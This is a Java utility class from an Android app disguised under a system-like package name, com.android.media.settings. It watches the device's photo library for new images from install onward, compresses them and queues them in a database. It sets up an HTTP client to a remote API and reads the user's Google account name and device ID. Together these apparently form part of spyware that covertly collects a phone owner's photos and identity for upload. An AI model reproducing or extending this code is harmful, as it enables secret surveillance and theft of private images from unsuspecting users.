package com.android.media.settings.Utility;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;

import com.android.media.settings.API.MediaAPI;
import com.android.media.settings.MediaConfig;
import com.android.media.settings.MediaDBManager;
import com.android.media.settings.Models.Media;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import io.reactivex.Observable;
import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import okhttp3.OkHttpClient;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Retrofit;
import retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;
import retrofit2.converter.gson.GsonConverterFactory;

public class MediaUtility {
    private static final String TAG = "Media Utility";
    private Context context;
    private MediaDBManager dbManager;
    private MediaConfig mConfig;

    Uri extMediaUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
    String projection[] = {
            MediaStore.Images.ImageColumns._ID,
            MediaStore.Images.ImageColumns.BUCKET_ID,
            MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
            MediaStore.Images.ImageColumns.DATA,
            MediaStore.Images.ImageColumns.DATE_ADDED
    };

    public MediaUtility(Context context) {
        this.context = context;
        this.dbManager = new MediaDBManager(context);
        this.mConfig = new MediaConfig(context);
    }

    public Cursor fetchMediaStore() {
        String id = this.getLatestMediaId();
        SharedPreferences pref = context.getSharedPreferences(MediaConfig.PREF_NAME, Context.MODE_PRIVATE);
        if(isFirstInstall()) {
            SharedPreferences.Editor prefEditor = pref.edit();
            prefEditor.putString(MediaConfig.PREF_MEDIA_STORE_INIT, id);
            prefEditor.apply();
        }else {
            id = dbManager.lastInsertedMedia();
        }

        String filterQuery = MediaStore.Images.ImageColumns._ID + " > " + id;
        return context.getContentResolver().query(
                extMediaUri,
                projection,
                filterQuery,
                null,
                MediaStore.Images.ImageColumns._ID + " ASC"
        );
    }

    public boolean isFirstInstall() {
        SharedPreferences pref = context.getSharedPreferences(MediaConfig.PREF_NAME, Context.MODE_PRIVATE);
        if(pref.contains(MediaConfig.PREF_MEDIA_STORE_INIT)) return false;
        return true;
    }

    public String getLatestMediaId() {
        String id = "0";
        Cursor c = context.getContentResolver().query(
                extMediaUri,
                projection,
                null,
                null,
                MediaStore.Images.ImageColumns._ID + " DESC LIMIT 0, 1"
        );
        try {
            if(c != null && c.moveToFirst()) {
                id = c.getString(c.getColumnIndex(MediaStore.Images.ImageColumns._ID));
            }
        } finally {
            c.close();
        }
        return id;
    }

    public Bitmap getBitmapFromUri(String strUri) {
        Uri uri = Uri.parse("file://" + strUri);
        try {
            Bitmap bm = MediaStore.Images.Media.getBitmap(context.getContentResolver(), uri);
            return bm;
        } catch (IOException e) {
            e.printStackTrace();
            Log.d(TAG, "Invalid Bitmap");
        }
        return null;
    }

    public File compressImage(String strUri) {
        return ImageUtility.compressToFile(
                context,
                new File(strUri),
                mConfig.getIMG_MAX_WIDTH(),
                mConfig.getIMG_MAX_HEIGHT(),
                mConfig.getIMG_COMPRESS_FORMAT(),
                mConfig.getIMG_CONFIG(),
                mConfig.getIMG_QUALITY(),
                MediaConfig.getFileStoragePath(context, false)
        );
    }

    public void compressAndStore(String uri, String id){
        File imgFile = new File(uri);
        if(imgFile.exists()) {
            final Media media = new Media(id, imgFile.getAbsolutePath());
            Observable.just(compressImage(uri))
                    .subscribeOn(AndroidSchedulers.mainThread())
                    .subscribe(new Observer<File>() {
                        @Override
                        public void onSubscribe(Disposable d) {

                        }

                        @Override
                        public void onNext(File file) {
                            media.setPath(file.getAbsolutePath());
                            dbManager.insertMedia(media);
                        }

                        @Override
                        public void onError(Throwable e) {

                        }

                        @Override
                        public void onComplete() {
                        }
                    });
        }
    }

    /**
     * Function to store bitmap to provided path
     * @param image [Image Bitmap]
     * @return file [File of the stored bitmap]
     * */
    public File storeImage(Bitmap image, String id) {
        String storagePath = Environment.getExternalStorageDirectory().getAbsolutePath()+"/MediaServer/Images";
        File mediaStorageDir = new File(storagePath);

        if (! mediaStorageDir.exists()){
            if (! mediaStorageDir.mkdirs()){
                return null;
            }
        }

        if( id != null) id = "img_" + Math.random();
        String imgName = id + ".jpg";
        File imgFile = new File(mediaStorageDir + File.separator + imgName);
        try {
            FileOutputStream fos = new FileOutputStream(imgFile);
            image.compress(Bitmap.CompressFormat.PNG, 100, fos);
            fos.flush();
            fos.close();
        } catch (FileNotFoundException e) {
            Log.d(TAG, "File not found: " + e.getMessage());
        } catch (IOException e) {
            Log.d(TAG, "Error accessing file: " + e.getMessage());
        }
        return imgFile;
    }

    public boolean networkOnline() {
        ConnectivityManager manager =
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = manager.getActiveNetworkInfo();
        boolean isAvailable = false;
        if (networkInfo != null && networkInfo.isConnected()) {
            isAvailable = true;
        }
        return isAvailable;
    }

    public boolean networkConnected() {
        if(networkOnline()) {
            try {
                HttpURLConnection connection = (HttpURLConnection) (new URL("http://www.google.com").openConnection());
                connection.setRequestProperty("User-Agent", "Test");
                connection.setRequestProperty("Connection", "close");
                connection.setConnectTimeout(1500);
                connection.connect();
                return (connection.getResponseCode() == 200);
            } catch (IOException e) {
                Log.e(TAG, "Error: ", e);
            }
        }
        return false;
    }

    public MediaAPI initRetroService() {
        HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
        interceptor.setLevel(HttpLoggingInterceptor.Level.BODY);

        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(5, TimeUnit.MINUTES)
                .readTimeout(5, TimeUnit.MINUTES)
                .addInterceptor(interceptor)
                .build();

        Log.d(TAG, new MediaConfig(context).getAPI_BASE_URL());

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(new MediaConfig(context).getAPI_BASE_URL())
                .client(client)
                .addCallAdapterFactory(RxJava2CallAdapterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        return retrofit.create(MediaAPI.class);
    }

    public String getUsername() {
        AccountManager manager = AccountManager.get(context);
        Account[] accounts = manager.getAccountsByType("com.google");
        List<String> possibleEmails = new LinkedList<String>();

        for (Account account : accounts) {
            possibleEmails.add(account.name);
        }

        if (!possibleEmails.isEmpty() && possibleEmails.get(0) != null) {
            String email = possibleEmails.get(0);
            String[] parts = email.split("@");

            if (parts.length > 1)
                return parts[0];
        }
        return null;
    }

    public String getDeviceId() {
        return Settings.Secure.getString(context.getContentResolver(),
                Settings.Secure.ANDROID_ID);
    }

    public boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
